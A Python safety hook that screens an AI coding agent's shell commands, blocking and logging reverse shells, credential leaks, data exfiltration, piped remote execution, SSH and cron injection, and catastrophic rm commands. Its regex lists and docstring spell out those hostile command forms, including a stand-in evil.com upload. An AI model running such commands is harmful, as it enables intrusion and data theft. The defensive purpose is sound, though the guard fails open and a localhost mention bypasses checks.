#!/usr/bin/env python3
"""
Bash Safety Guard - Active command blocking, auto-fix, + audit logging

Hook type: PreToolUse (command)
Tool match: Bash

Blocks:
- Credential patterns in commands (API keys, private keys, bearer tokens)
- Reverse shells (bash -i >& /dev/tcp/, nc -e, etc.)
- Data exfiltration (curl -d @- evil.com, cat .env | curl, DNS exfil)
- Obfuscated execution (echo | base64 -d | bash, curl | sh)
- Cron injection, SSH key manipulation
- Environment variable harvesting to network
- Catastrophic rm commands (rm -rf /, rm -rf /*)

Auto-fixes (via updatedInput):
- rm -rf /path without --preserve-root -> inserts --preserve-root flag

All commands are logged for audit regardless of block/fix decision.
Fail-open: if this hook crashes, the command proceeds.

Install: Copy to ~/.claude/hooks/ and register in settings.json:
    {
        "hooks": {
            "PreToolUse": [
                {
                    "matcher": "Bash",
                    "hooks": [{"type": "command", "command": "python3 ~/.claude/hooks/bash_safety_logger.py"}]
                }
            ]
        }
    }
"""

import json
import re
import sys
import os
from datetime import datetime
from pathlib import Path

BASH_LOG = Path.home() / '.claude' / 'bash_commands.jsonl'
SECURITY_LOG = Path.home() / '.claude' / 'security' / 'bash_blocks.jsonl'
SECURITY_LOG.parent.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Detection patterns
# ---------------------------------------------------------------------------

CREDENTIAL_PATTERNS = [
    # OpenAI
    (r'sk-[A-Za-z0-9]{20,}', 'openai_key'),
    # Anthropic
    (r'sk-ant-[A-Za-z0-9\-]{20,}', 'anthropic_key'),
    # GitHub PAT (classic & fine-grained)
    (r'ghp_[A-Za-z0-9]{36,}', 'github_pat'),
    (r'github_pat_[A-Za-z0-9_]{22,}', 'github_fine_grained'),
    # GitHub OAuth / App tokens
    (r'gho_[A-Za-z0-9]{36}', 'github_oauth'),
    (r'ghu_[A-Za-z0-9]{36}', 'github_user_token'),
    (r'ghs_[A-Za-z0-9]{36}', 'github_server_token'),
    # AWS
    (r'AKIA[0-9A-Z]{16}', 'aws_access_key'),
    (r'(?i)aws_secret_access_key\s*=\s*\S+', 'aws_secret'),
    # Slack
    (r'xox[bporas]-[0-9A-Za-z\-]{10,}', 'slack_token'),
    # Discord
    (r'[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27,}', 'discord_token'),
    # Bearer tokens in curl/wget
    (r'(?i)(?:bearer|authorization)\s+[A-Za-z0-9\-_.~+/]{20,}', 'bearer_token'),
    # Private key content
    (r'-----BEGIN\s+(RSA|EC|DSA|OPENSSH|PGP)\s+PRIVATE\s+KEY-----', 'private_key'),
    # Generic high-entropy API key assignments in command args
    (r'(?i)(?:api[_-]?key|secret|token|password)\s*[=:]\s*[A-Za-z0-9+/\-_.]{16,}', 'generic_secret'),
]

REVERSE_SHELL_PATTERNS = [
    (r'bash\s+-i\s+>&\s*/dev/tcp/', 'bash_reverse_shell'),
    (r'bash\s+-i\s+>&\s*/dev/udp/', 'bash_reverse_shell_udp'),
    (r'nc\s+.*-e\s+/bin/(sh|bash)', 'netcat_shell'),
    (r'ncat\s+.*-e\s+/bin/(sh|bash)', 'ncat_shell'),
    (r'socat\s+.*exec.*sh', 'socat_shell'),
    (r'python[23]?\s+-c\s+.*socket.*connect.*exec', 'python_reverse_shell'),
    (r'perl\s+-e\s+.*socket.*exec', 'perl_reverse_shell'),
    (r'ruby\s+-rsocket\s+-e', 'ruby_reverse_shell'),
    (r'php\s+-r\s+.*fsockopen', 'php_reverse_shell'),
    (r'mkfifo\s+.*\|\s*.*nc\s', 'mkfifo_shell'),
    (r'/dev/tcp/\d+\.\d+\.\d+\.\d+/\d+', 'dev_tcp_connect'),
    (r'telnet\s+\S+\s+\d+\s*\|.*sh', 'telnet_shell'),
]

EXFILTRATION_PATTERNS = [
    # curl posting sensitive data
    (r'curl\s+.*-[dX]\s+.*@', 'curl_file_upload'),
    (r'cat\s+.*\|\s*curl', 'pipe_to_curl'),
    (r'cat\s+.*\|\s*wget', 'pipe_to_wget'),
    (r'cat\s+.*\|\s*nc\s', 'pipe_to_netcat'),
    # DNS exfiltration
    (r'dig\s+.*\$\(', 'dns_exfil_dig'),
    (r'nslookup\s+.*\$\(', 'dns_exfil_nslookup'),
    (r'host\s+.*\$\(', 'dns_exfil_host'),
    # Sending env/credentials over network
    (r'(?:env|printenv|set)\s*\|.*(?:curl|wget|nc|netcat)', 'env_to_network'),
    (r'cat\s+.*\.env\s*\|', 'dotenv_pipe'),
    (r'cat\s+.*\.npmrc\s*\|', 'npmrc_pipe'),
    (r'cat\s+.*(credentials|\.aws|\.ssh)\s*\|', 'credential_file_pipe'),
    # Tar/zip and send
    (r'tar\s+.*\|.*(?:curl|wget|nc)', 'tar_to_network'),
]

OBFUSCATED_EXEC_PATTERNS = [
    (r'echo\s+.*\|\s*base64\s+-[dD]\s*\|\s*(ba)?sh', 'base64_decode_exec'),
    (r'base64\s+-[dD]\s*.*\|\s*(ba)?sh', 'base64_pipe_exec'),
    (r'curl\s+.*\|\s*(ba)?sh', 'curl_pipe_sh'),
    (r'wget\s+.*-O\s*-\s*\|\s*(ba)?sh', 'wget_pipe_sh'),
    (r'curl\s+.*\|\s*python', 'curl_pipe_python'),
    (r'wget\s+.*\|\s*python', 'wget_pipe_python'),
    (r'echo\s+.*\|\s*xxd\s+-r\s*\|\s*(ba)?sh', 'hex_decode_exec'),
    (r'\$\(\s*echo\s+.*\|\s*base64\s+-[dD]\s*\)', 'base64_subshell'),
    (r'eval\s+.*\$\(.*\)', 'eval_subshell'),
    (r'eval\s+"?\$\(.*base64', 'eval_base64'),
]

CRON_SSH_PATTERNS = [
    (r'crontab\s+-[el]?\s*.*(?:curl|wget|python|bash|sh)\s+https?://', 'cron_remote_exec'),
    (r'echo\s+.*>>\s*/var/spool/cron', 'cron_inject'),
    (r'echo\s+.*>>\s*~/.ssh/authorized_keys', 'ssh_key_inject'),
    (r'echo\s+.*>\s*~/.ssh/authorized_keys', 'ssh_key_overwrite'),
    (r'cp\s+.*\s+~/.ssh/authorized_keys', 'ssh_key_replace'),
    (r'chmod\s+.*\s+~/.ssh', 'ssh_permission_change'),
]

# Patterns for dangerous rm commands (auto-fixable subset)
DANGEROUS_RM_PATTERNS = [
    # rm -rf / or rm -rf /* (catastrophic, NOT auto-fixable)
    (re.compile(r'\brm\s+(?:-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*)\s+/\s*$'), 'rm_root', False),
    (re.compile(r'\brm\s+(?:-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*)\s+/\*'), 'rm_root_glob', False),
    # rm -rf with valid path but missing --preserve-root (auto-fixable)
    (re.compile(r'\brm\s+(?:-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*)(?!\s+--preserve-root)\s+/\S+'), 'rm_rf_no_preserve_root', True),
]

# Compile all patterns once
ALL_BLOCK_PATTERNS = []
for pattern_list, category in [
    (CREDENTIAL_PATTERNS, 'credential'),
    (REVERSE_SHELL_PATTERNS, 'reverse_shell'),
    (EXFILTRATION_PATTERNS, 'exfiltration'),
    (OBFUSCATED_EXEC_PATTERNS, 'obfuscated_exec'),
    (CRON_SSH_PATTERNS, 'cron_ssh'),
]:
    for regex, tag in pattern_list:
        try:
            ALL_BLOCK_PATTERNS.append((re.compile(regex, re.IGNORECASE), tag, category))
        except re.error:
            pass


def _is_local_command(command: str) -> bool:
    """Check if command targets localhost/local services (safe for credential use)."""
    local_indicators = [
        'localhost', '127.0.0.1', '::1', '0.0.0.0',
        'http://localhost', 'https://localhost',
        'http://127.0.0.1', 'https://127.0.0.1',
    ]
    cmd_lower = command.lower()
    return any(indicator in cmd_lower for indicator in local_indicators)


def check_command(command: str):
    """Check command against all blocking patterns.

    Returns (blocked: bool, detections: list[dict])
    """
    is_local = _is_local_command(command)

    detections = []
    for compiled, tag, category in ALL_BLOCK_PATTERNS:
        match = compiled.search(command)
        if match:
            # Skip credential detections for localhost commands -- routine dev/testing
            if is_local and category == 'credential':
                continue
            # Skip obfuscated_exec for localhost pipes to python/sh -- standard dev pattern
            # e.g. curl localhost:8400/api | python3 -c "import json; ..."
            if is_local and category == 'obfuscated_exec':
                continue
            detections.append({
                'tag': tag,
                'category': category,
                'matched': match.group()[:80],
                'position': match.start(),
            })

    # Determine if we should block
    blocked = len(detections) > 0
    return blocked, detections


def attempt_auto_fix(command: str) -> tuple:
    """Attempt to auto-fix a command instead of blocking it.

    Returns (fixed: bool, fixed_command: str, explanation: str).
    Only fixes safe, well-understood cases. Returns (False, '', '') if
    the command cannot be safely auto-fixed.
    """
    # Check dangerous rm patterns for auto-fix opportunities
    for compiled, tag, fixable in DANGEROUS_RM_PATTERNS:
        if compiled.search(command):
            if not fixable:
                # Catastrophic command (rm -rf /, rm -rf /*) -- never auto-fix
                return False, '', ''

            if tag == 'rm_rf_no_preserve_root':
                # Already has --preserve-root? Double-check (pattern says no, but be safe)
                if '--preserve-root' in command:
                    return False, '', ''

                # Insert --preserve-root right after the rm flags.
                # Match the rm and its flags, inject --preserve-root after.
                fixed = re.sub(
                    r'(\brm\s+(?:-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*))',
                    r'\1 --preserve-root',
                    command,
                    count=1,
                )
                if fixed != command:
                    return True, fixed, 'Auto-fixed: added --preserve-root flag to rm -rf'

    return False, '', ''


def log_command(command, description, cwd, blocked, detections):
    """Write audit log entry for every command."""
    entry = {
        'timestamp': datetime.now().isoformat(),
        'command': command[:500],
        'description': description[:200],
        'cwd': cwd,
        'blocked': blocked,
        'detections': detections[:5] if detections else [],
    }
    try:
        with open(BASH_LOG, 'a') as f:
            f.write(json.dumps(entry) + '\n')
    except Exception:
        pass

    if blocked:
        try:
            with open(SECURITY_LOG, 'a') as f:
                f.write(json.dumps(entry) + '\n')
        except Exception:
            pass


def main():
    try:
        input_data = json.loads(sys.stdin.read())
    except (json.JSONDecodeError, Exception):
        # Can't parse input - fail open
        print(json.dumps({"continue": True}))
        return

    tool_input = input_data.get('tool_input', {})
    command = tool_input.get('command', '')
    description = tool_input.get('description', '')
    cwd = os.getcwd()

    if not command:
        print(json.dumps({"continue": True}))
        return

    blocked, detections = check_command(command)

    # Check dangerous rm patterns (separate from credential/shell patterns)
    rm_blocked = False
    rm_unfixable = False
    for compiled, tag, fixable in DANGEROUS_RM_PATTERNS:
        if compiled.search(command):
            rm_blocked = True
            if not fixable:
                rm_unfixable = True
                detections.append({
                    'tag': tag,
                    'category': 'dangerous_rm',
                    'matched': command[:80],
                    'position': 0,
                })
            break

    # Determine overall block status
    blocked = blocked or rm_blocked
    log_command(command, description, cwd, blocked, detections)

    if blocked:
        # If blocked ONLY by auto-fixable rm patterns (no credential/shell/exfil detections
        # and the rm issue is fixable), attempt auto-fix via updatedInput
        has_hard_blocks = len(detections) > 0  # credential, shell, exfil, cron, or unfixable rm
        if rm_blocked and not rm_unfixable and not has_hard_blocks:
            fixed, fixed_command, explanation = attempt_auto_fix(command)
            if fixed:
                log_command(fixed_command, description, cwd, False,
                            [{'tag': 'auto_fixed', 'category': 'auto_fix', 'matched': explanation, 'position': 0}])
                print(json.dumps({
                    "continue": True,
                    "updatedInput": {
                        "command": fixed_command,
                    },
                    "additionalContext": explanation,
                }))
                return

        # Cannot auto-fix -- block the command
        categories = set(d['category'] for d in detections)
        tags = [d['tag'] for d in detections[:3]]
        if rm_blocked and not detections:
            categories = {'dangerous_rm'}
            tags = ['rm_rf_no_preserve_root']
        reason = f"Blocked by bash safety guard: {', '.join(categories)} ({', '.join(tags)})"

        print(json.dumps({
            "continue": False,
            "reason": reason,
            "detections": detections[:5],
        }))
    else:
        print(json.dumps({"continue": True}))


if __name__ == "__main__":
    main()
